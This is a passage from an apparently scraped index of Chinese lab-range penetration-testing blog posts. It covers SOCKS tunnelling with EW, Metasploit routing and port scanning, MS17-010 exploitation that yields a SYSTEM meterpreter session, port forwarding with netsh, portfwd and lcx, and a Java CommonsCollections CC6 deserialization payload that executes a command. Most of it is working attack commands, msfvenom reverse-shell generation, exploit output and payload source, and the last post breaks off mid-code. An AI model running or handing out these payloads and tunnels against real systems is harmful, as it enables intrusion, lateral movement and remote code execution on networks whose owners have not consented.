//监听1080端口，1080接收的数据正向传给forward_ip的8888端口./ew -s lcx_slave -d vps_ip -e 8888 -f B_ip-g 9999 //作为中间角色，反向连接vps的8888，正向连接B的9999。打通两者 注意，这里的 .&#x2F;ew 是指 ew-master 目录下的任意一个可执行文件，根据对应的操作系统选择一个。 正向代理在 Windows Server 2019 上运行： 1ew_for_Win.exe -s ssocksd -l 1080 此时将 kali 的代理设置为 Windows Server 2019 的 IP + 端口 1080 即可访问内网中的其他机器。 反弹代理原理就是让 Windows Server 2019 主动去连接一台公网服务器，然后攻击者把这台公网服务器当代理，就可以访问内网了。 当然也可以直接让 Windows Server 2019 主动去连接 kali 攻击机，但是使用上一种方法可以隐藏 kali IP。 在一台 Ubuntu 公网服务器上执行监听： 1./ew_for_linux64 -s rcsocks -l 8080 -e 8888 那么此时这台公网服务器就会监听 8080 端口，并将 8080 端口接收的数据通过 8888 端口交互传递。简单点说，就是 kali 在设置代理的时候要设置 公网服务器 IP + 8080 端口 ，而 Windows Server 2019 则需要主动去连接这台公网服务器的 8888 端口。 如果没有执行权限的话需要赋予执行权限： 1chmod +x ew_for_linux64 在 Windows Server 2019 上执行以下命令与公网服务器建立连接： 1ew_for_Win.exe -s rssocks -d 公网服务器IP -e 8888 此时在 kali 上配置代理为 公网服务器 IP + 8080 端口 即可访问内网。 不过因为不明原因，本次实验失败，报错：代理服务器拒绝连接。","categories":["内网渗透"]},{"title":"内网渗透 02 - 端口扫描","path":"/2024/05/16/内网渗透/内网渗透02-内网扫描/","content":"收集内网 IP ，进行端口扫描。 内网渗透-端口扫描可以说内网渗透测试，其本质就是信息收集。信息收集的深度，直接关系到内网渗透测试的成败。当你拿下内网的一台主机后，面对的是一片未知的区域，所以首先要做的就是对当前所处的网络环境进行判断。包括以下几点： 对当前机器角色的判断 对当前机器所处的网络环境进行判断 对当前机器所处的网络区域进行判断 通过 ARP 缓存发现内网存活主机ARP 全称为 Address Resolution Protocol ，即地址解析协议，它是一个根据 IP 地址获取物理地址的 TCP&#x2F;IP 协议，主机发送信息时将包含目标 IP 地址的 ARP 请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址，收到返回消息后将该 IP 地址和物理地址存入本机 ARP 缓存中并保留一定时间，下次请求时直接查询 ARP 缓存以节约资源。 因此，可以通过查看 arp 缓存来发现内网主机： 1arp -a 发现 52 网段的其他存活主机，如 192.168.52.138，192.168.52.143 ： 至于这里的 192.168.52.1，192.168.52.254，192.168.52.255 都是无关紧要的网关或者广播地址之类的，不用管。 那么就提取到了两个已知目标： 12192.168.52.138 00-0c-29-1e-96-24 dynamic192.168.52.143 00-0c-29-22-d2-55 dynamic 除此之外，也可以通过 msf 查看路由信息，发现内网网段： 1234567891011121314151617meterpreter &gt; run get_local_subnets[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.[!] Example: run post/multi/manage/autoroute OPTION=value [...]Local subnet: 192.168.43.0/255.255.255.0Local subnet: 192.168.52.0/255.255.255.0Local subnet: ::/ffff:ffff::Local subnet: ::1/ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffffLocal subnet: 2408:8453:f53a:68a8::/ffff:ffff:ffff:ffff:ffff:ffff::Local subnet: 2408:8453:f53a:68a8:e8b6:6970:f9e1:6003/ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffffLocal subnet: fe80::/ffff:ffff:ffff:ffff:ffff:ffff::Local subnet: fe80::/ffff:ffff:ffff:ffff:ffff:ffff::Local subnet: fe80::cc27:7c90:8e9e:d18e/ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffffLocal subnet: fe80::e8b6:6970:f9e1:6003/ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffffLocal subnet: ff00::/ff00::Local subnet: ff00::/ff00::Local subnet: ff00::/ff00:: msf 内网端口扫描msf 端口扫描的模块先查看一下支持的端口扫描类型： ACK 防火墙扫描1use auxiliary/scanner/portscan/ack SYN 端口扫描1use auxiliary/scanner/portscan/syn 通过 wireshark 抓包可以看到，底层是通过发送 SYN 数据包去建立三次握手，通过回应的数据包来判断端口是否打开： TCP 端口扫描1use auxiliary/scanner/portscan/tcp 同样使用 wireshark 抓包查看，发现和 SYN 扫描原理差不多，区别在于这种扫描会完成三次握手的连接，SYN 扫描直接发送一个 RST 数据包去拒绝连接： xmas 扫描1use auxiliary/scanner/portscan/xmas xmas 扫描通过发送 fin 数据包，根据目标端口是否有回应来判断端口是否打开： 扫描各服务版本 msf 两种内网扫描方式对上述两个目标进行端口或服务扫描，可以通过配置 msf 路由和 msf 代理来实现。 msf 路由通过添加路由的方式让 kali 能访问到内网中的其他机器。 打印路由表： 1meterpreter &gt; run autoroute -p 添加路由至本地（添加完后记得再打印一次路由表看添加是否成功）： 12345678# meterpreter 原始方法meterpreter &gt; run autoroute -s 192.168.52.0/24# 或者使用新方法自动添加路由meterpreter &gt; run post/multi/manage/autoroute# 或者在 msf 控制台中添加路由msf6 exploit(multi/handler) &gt; route add 192.168.52.0/24 [session ID] 退回至 msf 控制台： 1meterpreter &gt; background 在 msf 控制台打印路由表： 1msf6 exploit(multi/handler) &gt; route print msf 使用端口扫描模块（TCP 端口扫描器）： 1msf6 exploit(multi/handler) &gt; use auxiliary/scanner/portscan/tcp auxiliary/scanner/portscan/tcp 模块设置： 1234set rhosts 192.168.52.138\t#设置要扫描的内网IPset threads 10 #设置线程数，影响速度快慢set ports 1-500 #设置要扫描的端口范围run #开始扫描 MS17-010 内网渗透搜索有关此漏洞的利用模块： 1search ms17-010 使用 exploit/windows/smb/ms17_010_psexec 模块： 1use 1 模块选项设置： 1set rhost 192.168.52.138 开始执行： 1run 执行结果： 1Exploit completed, but no session was created. 前面的执行都不报错，最后出现这种结果，是因为 kali 能通过各种方式访问到内网中的机器，而内网中的机器无法访问到 kali ，因此无法建立反弹 shell 。 既然反弹 shell 不行，那就建立正向连接。可以看到，该模块默认的 payload 为 windows/meterpreter/reverse_tcp ： 将 payload 改为 windows/meterpreter/bind_tcp 正向连接（kali 主动去连接目标机器）： 1set payload windows/meterpreter/bind_tcp 再次执行，成功获取连接： 1234567891011msf6 exploit(windows/smb/ms17_010_psexec) &gt; run[*] 192.168.52.138:445 - Target OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1[*] 192.168.52.138:445 - Built a write-what-where primitive...[+] 192.168.52.138:445 - Overwrite complete... SYSTEM session obtained![*] 192.168.52.138:445 - Selecting PowerShell target[*] 192.168.52.138:445 - Executing the payload...[+] 192.168.52.138:445 - Service start timed out, OK if running a command or non-service executable...[*] Started bind TCP handler against 192.168.52.138:4444[*] Sending stage (176198 bytes) to 192.168.52.138[*] Meterpreter session 9 opened (192.168.52.128:51814 -&gt; 192.168.52.138:4444 via session 8) at 2024-04-13 00:31:52 -0400 查看系统信息： 12345678meterpreter &gt; sysinfoComputer : OWAOS : Windows Server 2008 R2 (6.1 Build 7601, Service Pack 1).Architecture : x64System Language : zh_CNDomain : GODLogged On Users : 3Meterpreter : x86/windows msf 代理简单地说，就是将 kali 能够直接访问到的机器作为代理，进而访问内网中的其他机器。想要配置 msf 代理，那么必须先配置好 msf 路由。 socks 协议 socks 协议工作在会话层，能为各种协议提供代理服务。socks4 与 socks5 的区别在于除了 tcp 协议外，socks5 还支持 udp 协议。 使用 auxiliary&#x2F;server&#x2F;socks_proxy 模块设置代理： 1use auxiliary/server/socks_proxy 直接运行即可： 1run 查看代理设置是否成功： 1jobs 设置成功之后就可以利用此代理进行内网扫描了。 关闭代理： 12jobs -k [ID] #关闭指定ID的代理jobs -K #关闭所有代理 **利用 proxychains 使用此代理（当然在其他地方用也是可以的） ** 在 proxychains 配置文件的最后一行添加如下内容： 1socks5 127.0.0.1 1080 测试代理配置是否成功： 1proxychains curl http://192.168.52.143/ 成功得到返回值，说明此时能够访问内网。 那么就可以利用 namp 之类的工具进行扫描了，比如主机发现（未验证成功）： 1proxychains nmap -sn 192.168.52.0/24 再比如 dirb 目录扫描： 1proxychains dirb http://192.168.52.143/ 不过，由于 socks5 仅支持 TCP&#x2F;UDP 及以上协议，所以有些不使用这些协议的工具是没办法用 socks 代理的。 使用 msf 进行主机发现 设置好代理之后也可以用 msf 的模块进行内网主机发现。 使用 auxiliary&#x2F;scanner&#x2F;discovery&#x2F;udp_sweep 模块进行内网主机发现： 1use auxiliary/scanner/discovery/udp_sweep 设置模块： 123set rhosts 192.168.52.0/24set threads 50run","categories":["内网渗透"]},{"title":"内网渗透 01 - 端口转发","path":"/2024/05/16/内网渗透/内网渗透01-端口转发/","content":"在进行渗透测试过程中会遇到内网中的其他机器是不允许外网机器访问的，因此需要通过端口转发(即隧道)或将得到的外网服务器设置为代理，使得攻击机可以直接访问并操作内网中的其他机器，这一过程就叫做内网转发。 红日靶场（一）搭建推荐博客：[WEB安全]红日靶场（一）环境搭建 初始密码：hongrisec@2019 设置好网段如下： 在此划分出 VMnet1 和 VMnet8 两个网段，VMnet1 为 Windows 虚拟机的内网网段，VMnet8 为模拟的外网网段。 可以在物理机 win11 上查看： win2003 太抽象了，所以换成 win2019 。 最终形成的 IP 划分情况如下： 主机 IP地址 物理机 win11 192.168.217.1（ VMnet8 的 IP ） win7 边界服务器 外网IP：192.168.217.137；内网IP：192.168.52.143 win2008 内网IP：192.168.52.138 win2019 内网IP：192.168.52.128 win2003（弃用） 内网IP：192.168.52.141 提示密码过期，那么我们重新设置一下密码： win7：win7@test win server 2003（弃用）：win2003@test win server 2008：win2008@test win server 2019：Administrator - ChinaSkills22 内网环境至此就搭好了，其中 win7 为边界服务器，在外网中开放，而 win2008 和 win2019 不对公网开放。 在测试时，一定要将 Windows 的防火墙全部关闭哦~ 但是，按照上面的搭建方法，即使 kali 在 VMnet8 网段中，也能访问到 VMnet1 网段（即内网）的机器，这明显不符合要求。因此，我将 kali 与 win7 的其中一个网卡设置为桥接网卡，抛弃了 VMnet8 网段，但也因此无法使用校园网。在这种情况下，kali 就只能访问 win7 的外网 IP ，而无法访问内网网段了。 此时我的 kali IP：192.168.43.173，win 7 外网 IP：192.168.43.136 。 之后遇到的问题就是 shell 没有办法上传到 win7 虚拟机上，无论是复制粘贴还是 mount 挂载，于是我又做了一些调整，将 win2019 作为边界服务器，在外网开放，而 win7 则作为内网机器。 此时我的 win2019 的外网 IP 为：192.168.43.13 。 xampp XAMPP（Apache+MySQL+PHP+PERL）是一个功能强大的建站集成软件包。 perl Perl 是由 Larry Wall 设计的，并由他不断更新和维护的编程语言。 Perl 具有高级语言（如 C ）的强大能力和灵活性。事实上，你将看到，它的许多特性是从 C 语言中借用来的。 Perl 与脚本语言一样，Perl 不需要编译器和链接器来运行代码，你要做的只是写出程序并告诉 Perl 来运行而已。这意味着 Perl 对于小的编程问题的快速解决方案和为大型事件创建原型来测试潜在的解决方案是十分理想的。 Perl 提供脚本语言（如 sed 和 awk ）的所有功能，还具有它们所不具备的很多功能。Perl 还支持 sed 到 Perl 及 awk 到 Perl 的翻译器。 简而言之，Perl 像 C 一样强大，像 awk 、sed 等脚本描述语言一样方便。 通过上传 shell 使 kali 控制 win2019mount 挂载共享文件夹推荐博客：Linux 挂载 Windows 共享目录 创建要共享的文件夹： 1mkdir /mnt/myshare 挂载共享文件夹： 1mount -t cifs -o username=miao,password=Ab123456 //192.168.43.13/tiquan /mnt/myshare 查询挂载状态： 1mount 解除挂载： 1umount /mnt/myshare msf 生成 payload：1msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.43.173 lport=4444 -a x64 -f exe -o shell.exe 通过 mount 挂载的共享文件夹将 shell 传到 win2019 上： 1cp shell.exe /mnt/myshare/shell.exe 进入 msf 控制台： 1msfconsole 使用 use 进入模块，exploit&#x2F;multi&#x2F;handler 是 msf 的侦听模块： 1use exploit/multi/handler 设置 kali 的 IP 和端口号： 123set payload windows/x64/meterpreter/reverse_tcpset lhost 192.168.43.173set lport 4444 开启监听： 1run/exploit 此时在 win2019 上执行 shell.exe 即可。 从 meterpreter 进入 Windows 命令行： 1shell 解决编码问题： 1chcp 65001 内网渗透-端口转发在进行渗透测试过程中会遇到内网中的其他机器是不允许外网机器访问的，因此需要通过端口转发(即隧道)或将得到的外网服务器设置为代理，使得攻击机可以直接访问并操作内网中的其他机器，这一过程就叫做内网转发。 端口映射（Port Mapping）和端口转发（Port Forwarding）是网络配置中的两个概念，虽然有相似之处，但它们在用途和实现上有一些不同之处。 端口映射（Port Mapping）定义： 端口映射是一种将一个特定的端口号映射到另一个端口号的技术，通常用于路由器或防火墙来允许外部设备通过特定端口访问内部网络中的设备。 用法： 通常用于在内网（如局域网）中的某个设备（如服务器）需要被外部网络访问时，路由器或防火墙通过将外部请求的端口映射到内部设备的相应端口来实现。 例如，外部设备通过访问路由器的端口 80 来访问内网服务器的端口 8080 。 示例： 假设你有一个家庭网络，其中一台计算机运行一个 Web 服务器，监听端口 8080 。你希望外部用户能够通过访问你家庭网络的公共 IP 地址上的端口 80 来访问这个 Web 服务器。 公共 IP 地址：203.0.113.1 内部 IP 地址：192.168.1.100 内部 Web 服务器端口：8080 在路由器上设置端口映射，将公共 IP 的端口 80 映射到内部 IP 地址的端口 8080 ： 1203.0.113.1:80 -&gt; 192.168.1.100:8080 端口转发（Port Forwarding）定义： 端口转发是一种将网络流量从一个 IP 地址的特定端口重定向到另一个 IP 地址的特定端口的技术。这通常用于将外部网络的流量重定向到内部网络中的特定设备。 用法： 主要用于将外部网络的请求转发到内网中的设备，以实现对内网资源的访问。 比端口映射更广泛，通常不仅仅是端口号的映射，还包括 IP 地址的重定向。 通常用于允许外部设备通过路由器或防火墙访问内网设备上的服务。 示例： 与上例类似，但这次我们不仅重定向端口，还重定向流量到另一个内部设备： 公共 IP 地址：203.0.113.1 内部 Web 服务器 IP 地址：192.168.1.100 内部 Web 服务器端口：80 设置端口转发，将公共 IP 的端口 80 上的流量重定向到内部 Web 服务器的 IP 地址和端口： 1203.0.113.1:80 -&gt; 192.168.1.100:80 区别总结 端口映射（Port Mapping）：主要涉及端口号的映射，可以将外部端口映射到内部不同的端口。常用于在路由器或防火墙上设置特定的端口映射规则。 端口转发（Port Forwarding）：不仅可以涉及端口号的重定向，还可以涉及 IP 地址的重定向。常用于将外部网络的请求转发到内网中的设备，以实现对内网资源的访问。 尽管术语有时可以互换使用，但严格来说，端口转发更广泛，包含了端口映射的功能，但也涉及更复杂的流量重定向规则。 windows 命令行下用 netsh 实现端口转发自 Windows XP 开始，Windows 中就内置网络端口转发的功能。任何传入到本地端口的 TCP 连接（ IPv4 或 IPv6 ）都可以被重定向到另一个本地端口，或远程计算机上的端口，并且系统不需要有一个专门用于侦听该端口的服务。 在 Linux 中，使用 iptables 可以非常轻松地配置端口重定向。在 Windows Server 系统上，我们可以使用命令 Netsh 的 Portproxy 模式配置 Windows 中的端口转发。 netsh 命令已经推出很长时间，在 Windows 2000&#x2F;XP&#x2F;2003 中均带有 netsh 命令。Windows Server 2008 只是对 netsh 的参数项做了些扩展。 用法： 1netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport add v4tov4 - 添加 IPv4 listenaddress - 等待连接的本地 IP 地址。 listenport - 本地侦听 TCP 端口。 connectaddress - 将传入连接重定向到本地或远程 IP 地址（或 DNS 名称）。 connectport - 一个 TCP 端口，来自 listenport 的连接会被转发到该端口。 本地端口转发到本地端口示例： 将本地端口 3389 转发到本地端口 3340 ，其中，本地端口为 10.1.1.110 ： 1netsh interface portproxy add v4tov4 listenport=3340 listenaddress=10.1.1.110 connectport=3389 connectaddress=10.1.1.110 使用 netstat 确定 3340 端口当前处于被侦听状态： 123netstat -ano | findstr:3340或者netstat -antp tcp 显示系统中的转发规则列表： 1netsh interface portproxy show all 在我们的例子中，只有一个转发规则即从3340到3389端口的转发： 1234Listen on ipv4: Connect to ipv4:Address Port Address Port--------------- ---------- --------------- ----------10.1.1.110 3340 10.1.1.110 3389 删除指定的端口转发规则： 1netsh interface portproxy delete v4tov4 listenport=3340 listenaddress=10.1.1.110 清除所有当前的端口转发规则： 1netsh interface portproxy reset 重要：以上端口转发仅适用于 TCP 端口，对于 UDP 端口将不起作用，并且不能使用 127.0.0.1 作为连接地址。 将其他机器的端口转发至本机端口，比如将 192.168.100.101 的 3389 端口转发至本机的 3389 端口： 1netsh interface portproxy add v4tov4 listenport=3389 connectport=3389 connectaddress=192.168.100.101 这样执行完以后，访问本机的 3389 端口就可以访问到 192.168.100.101 的 3389 端口了。 3389 端口通常为 Windows 的远程桌面连接，因此需要先开启 Windows 的远程桌面连接才能实现端口转发，开启后，使用以下命令查看端口开放情况： 1netstat -an 可以看到 3389 端口已开放： MSF portfwd 端口转发与端口映射portfwd 是借用 meterpreter shell 建立的连接进行数据传输，达到端口转发的目的。 使用 portwd 进行端口转发： 1meterpreter &gt; portfwd add -l 1111 -r 127.0.0.1 -p 3389 -l 表示 localhost ，即 kali 本机； 因为此时已经与 Windows 目标机器建立了连接，所以 127.0.0.1 指的是已经被拿到 shell 的这台 Windows 机器。 配置完成后，访问 kali 的 1111 端口，就会转发到 Windows 目标机器的 3389 端口。 如果将 127.0.0.1 换成其他与 Windows 目标机器处于同一内网的 IP ，那么就可以直接将内网中的其他机器映射到 kali 上，实现内网穿透。 查看是否建立端口转发连接： 1portfwd list 按本地端口号删除删除连接： 1portfwd delete -l 1111 lcx.exe 端口转发工具lcx.exe 是一个端口转发工具，有 Windows 版和 Linux 版两个版本，Windows 版是 lcx.exe ，Linux 版为 portmap 。 下载链接：http://www.vuln.cn/wp-content/uploads/2016/06/lcx_vuln.cn_.zip Linux 中的使用 Linux 中下载： 1wget http://www.vuln.cn/wp-content/uploads/2016/06/lcx_vuln.cn_.zip 查看帮助文档： 1234567891011121314151617┌──(root㉿kali)-[~/lcx_vuln.cn]└─# ./portmap --helpSocket data transport toolby Sofia(www.vuln.cn)Usage:./portmap -m method [-h1 host1] -p1 port1 [-h2 host2] -p2 port2 [-v] [-log filename] -v: version -h1: host1 -h2: host2 -p1: port1 -p2: port2 -log: log the data -m: the action method for this tool 1: listen on PORT1 and connect to HOST2:PORT2 2: listen on PORT1 and PORT2 3: connect to HOST1:PORT1 and HOST2:PORT2Let me exit...all overd 这里有一个 -m 参数这个参数的解释：以哪种方式来用这个工具，然后下面有三个方式：1.监听 port1 端口并且连接主机 2 的 port2 端口2.监听 port1 和 port2 端口3.连接主机 1 对应的端口和主机 2 对应的端口 示例 将本机的 6666 端口映射到 192.168.164.8 主机的 22 端口： 1./portmap -m 1 -p1 6666 -h2 192.168.164.8 -p2 22 将本地 7777 端口上的服务转发到 6666 端口上： 1./portmap -m 2 -p1 6666 -h2 118.*.*.2 -p2 7777 将本地 22 端口转发到外网机器上的 6666 端口： 1./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 118.*.*.2 -p2 6666 Windows 中的使用 1、lcx 内网端口转发，内网穿透 把内网主机的 3389 端口转发到具有公网 ip 主机的 4444 端口： 1lcx.exe -slave 公网主机ip 4444 127.0.0.1 3389 监听公网主机本机的 4444 端口请求，并将来自 4444 端口的请求传送给 5555 端口： 1lcx.exe –listen 4444 5555 此时，RDP 连接，Windows 命令行下输入 mstsc ，即可打开远程桌面连接。 2、本地端口转发 由于防火墙限制，部分端口如 3389 无法通过防火墙，此时可以将该目标主机的 3389 端口转发到防火墙允许的其他端口，如 53 端口： 1lcx -tran 53 目标主机ip 3389 各种端口转发后如何连接80 端口：直接浏览器访问即可； 3389 端口：使用 rdesktop 命令，如： 1rdesktop 127.0.0.1:3389 3306 端口：使用 mysql 命令，如： 1mysql -u [用户名] -p [密码] -P [端口号]","categories":["内网渗透"]},{"title":"漏洞篇 - Java 反序列化之 CC6 链","path":"/2024/05/13/Java 安全/漏洞篇-CC6链分析/","content":"前面在分析 CC1链 的 ysoserial 版时，我们知道 LazyMap 的 get 方法会调用成员属性 factory 的 transform 方法，而我们上一次是通过 AnnotationInvocationHandler 的 invoke 方法来调用这个 get 方法的。那么还有哪里能调用 LazyMap 的 get 方法呢？我们的 CC6 链给出了另一条路径：TiedMapEntry 类的 getValue 方法会调用成员属性的 get 方法。 CC6 链分析JDK 8u71 版本之后 AnnotationInvocationHandler 的 readObject 方法被改写，CC1 链无法利用，于是引出了可以不需要经过 AnnotationInvocationHandler 类的 CC6 链。 利用链之 TiedMapEntry 类TiedMapEntry 的 getValue 方法：123public Object getValue() &#123; return map.get(key);&#125; map 是 TiedMapEntry 类中定义的一个属性： 1private final Map map; 这个成员属性在 TiedMapEntry 的构造方法中被赋值： 12345public TiedMapEntry(Map map, Object key) &#123; super(); this.map = map; this.key = key;&#125; 而这个构造方法被 public 修饰，可以直接调用。那么只需要将 this.map 设置成 LazyMap 对象就好了。将 this.map 设置成 LazyMap 对象以后，在 TiedMapEntry 的 getValue 方法中，会将 TiedMapEntry 的 成员属性 key 作为 LazyMap 对象的 get 方法的参数传入，这个 key 接下来会被作为 transform 的参数，那么就应该知道 key 应该传什么了，应该传 Runtime.class 。 接下来要找谁调用了 TiedMapEntry 的 getValue 方法，TiedMapEntry 的 hashCode 方法调用了此方法。 TiedMapEntry 的 hashCode 方法：12345public int hashCode() &#123; Object value = getValue(); return (getKey() == null ? 0 : getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); &#125; 要想调用 TiedMapEntry 的 hashCode 方法，可以把 TiedMapEntry 对象作为 HashMap 对象的 key 传入，这样在反序列化 HashMap 对象时，调用 HashMap 对象的 readObject 方法，就会调用 key 的 hashCode 方法。这是在学习 URLDNS 链时已经学到的内容，这里不妨再复习一下。 入口类之 HashMapHashMap 的 readObject 方法：12345678910111213141516171819202122232425262728293031323334353637383940private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException &#123; // Read in the threshold (ignored), loadfactor, and any hidden stuff s.defaultReadObject(); reinitialize(); if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) throw new InvalidObjectException(&quot;Illegal load factor: &quot; + loadFactor); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings &lt; 0) throw new InvalidObjectException(&quot;Illegal mappings count: &quot; + mappings); else if (mappings &gt; 0) &#123; // (if zero, use defaults) // Size the table using given load factor only if within // range of 0.25...4.0 float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f); float fc = (float)mappings / lf + 1.0f; int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;) Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i &lt; mappings; i++) &#123; @SuppressWarnings(&quot;unchecked&quot;) K key = (K) s.readObject(); @SuppressWarnings(&quot;unchecked&quot;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); &#125; &#125;&#125; 结尾处的这一句： 1putVal(hash(key), key, value, false, false); 会调用 HashMap 的 hash 方法。 HashMap 的 hash 方法：1234static final int hash(Object key) &#123; int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125; 在这里就会调用 key 的 hashCode 方法。 利用链已经明了，开始构造 payload 。 构造 payload1123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;public class payload &#123; public static void main(String[] args) throws Exception &#123; // 获取包含执行类的 ChainedTransformer 对象 Transformer[] transformers = new Transformer[]&#123; // 将传入参数固定为 Runtime.class new ConstantTransformer(Runtime.class), new InvokerTransformer (&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer (&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer (&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // 新建一个 Map 对象，无关紧要，只是作为参数传入 Map&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); // 初始化利用链 LazyMap Map lazymap = LazyMap.decorate(hashMap, chainedTransformer); // 初始化利用链 TiedMapEntry TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, Runtime.class); // 初始化利用链 HashMap HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); map.put(tiedMapEntry, &quot;test&quot;); serialize(map); unserialize(&quot;ser.bin&quot;); &#125; public static void serialize(Object obj) throws Exception &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); &#125; public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; &#125;&#125; payload 构造完成，但是在运行的时候会发现一个问题，就是序列化的时候也会进行一次命令执行，原因是 HashMap 的 put 方法也会调用 key 的 hashCode 方法。 HashMap 的 put 方法： 123public V put(K key, V value) &#123; return putVal(hash(key), key, value, false, true);&#125; 这里会调用 HashMap 的 hash 方法，进而调用 key 的 hashCode 方法。 我们肯定不希望自己的计算机上也执行一遍恶意命令对吧，所以我们需要避免序列化的时候命令执行，这也是以后的反序列化利用需要注意的问题。 改进 payload如何避免序列化时命令执行呢，在 map.put 方法执行之前，我们先传入一个不包含 chainedTransformer 的 LazyMap 对象，在 map.put 方法执行之后，再修改这个 LazyMap 对象的 factory 属性为 chainedTransformer 即可。 问题抛出然而当我这样修改之后，又发现了一个问题： 我在调用 TiedMapEntry 构造方法时： 12345public TiedMapEntry(Map map, Object key) &#123; super(); this.map = map; this.key = key;&#125; 明明代码上只写了将传入的 key 作为 TiedMapEntry 对象的 key 属性值，但是在执行完这一步后发现 TiedMapEntry 对象的 map 属性的 key 属性值也变为了传入的 key 值。 执行 this.key &#x3D; key 之前，map 中只有一个 null -&gt; 1 的键值对： 执行 this.key &#x3D; key 之后，map 中多了一个 aaa -&gt; 1 的键值对： 很奇异，翻了很多大佬的博客，但是都没有讲明原因，后来与好友交流，得出了一种较为合理的解释。 参见：幽默的Common-Collections6调试 还记得我们之前说过的吗：IDEA 在 debug 时，当 debug 到某个对象的时候，会调用对象的 toString() 方法，用来在 debug 界面显示对象信息。 这里正是由于 TiedMapEntry 对象的 toString() 方法在调试时被调用了，来看 TiedMapEntry 的 toString() 方法： 123public String toString() &#123; return getKey() + &quot;=&quot; + getValue();&#125; 这里调用了 TiedMapEntry 的 getValue() 方法： 123public Object getValue() &#123; return map.get(key);&#125; 于是就会接着调用其成员属性 map 的 get() 方法，也即 LazyMap 对象的 get() 方法： 123456789public Object get(Object key) &#123; // create value for key if key is not currently in the map if (map.containsKey(key) == false) &#123; Object value = factory.transform(key); map.put(key, value); return value; &#125; return map.get(key);&#125; 第一次进来，LazyMap 对象的 map 属性 key 值为 null ，不包含传入的 key 值，所以进入判断，在 map.put(key, value); 处将 LazyMap 对象的 map 属性 key 值设置成了传入的 key 值，这就造成了调试完 TiedMapEntry 构造方法后 LazyMap 对象的 map 属性就已经有 key 值了。 所以如果是真实运行环境的话，它的流程应该是这样的：在 TiedMapEntry 的构造方法被调用之后，调用 HashMap 的 put 方法时： 123TiedMapEntry tiedMapeEntry = new TiedMapEntry(lazymap, &quot;key&quot;);HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();map2.put(tiedMapeEntry, &quot;test&quot;); 运行时调用链： 1map2::put() -&gt; map2::hash() -&gt; tiedMapeEntry::hashCode() -&gt; tiedMapeEntry::getValue() -&gt; lazymap::get() 于是在这里 lazymap 的 map 属性的 key 值被设置成了传入的 key 值，这将导致下一次调用 lazymap 的 get() 方法时（反序列化时）将不会进入判断，从而无法命令执行。 所以需要在 put 方法调用完之后删除掉 lazymap 的 map 属性的 key 值： 1lazymap.remove(&quot;key&quot;); 构造 payload212345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class payload2 &#123; public static void main(String[] args) throws Exception &#123; // 获取包含执行类的 ChainedTransformer 对象 Transformer[] transformers = new Transformer[]&#123; // 将传入参数固定为 Runtime.class new ConstantTransformer(Runtime.class), new InvokerTransformer (&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer (&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer (&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // 新建一个 